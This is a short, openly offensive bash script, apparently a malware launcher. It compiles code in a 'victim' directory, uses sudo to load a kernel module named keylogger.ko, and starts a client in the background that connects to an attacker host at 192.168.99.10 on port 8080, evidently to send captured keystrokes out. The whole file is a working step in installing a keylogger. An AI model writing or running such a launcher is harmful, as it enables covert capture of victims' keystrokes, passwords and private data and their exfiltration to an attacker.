#!/bin/bash

ATTACKER_IP="192.168.99.10"
ATTACKER_PORT=8080

cd /home/badguy/victim || exit 1

make

sudo insmod keylogger.ko

./client -ip "$ATTACKER_IP" -port "$ATTACKER_PORT" &

echo "[+] client is running"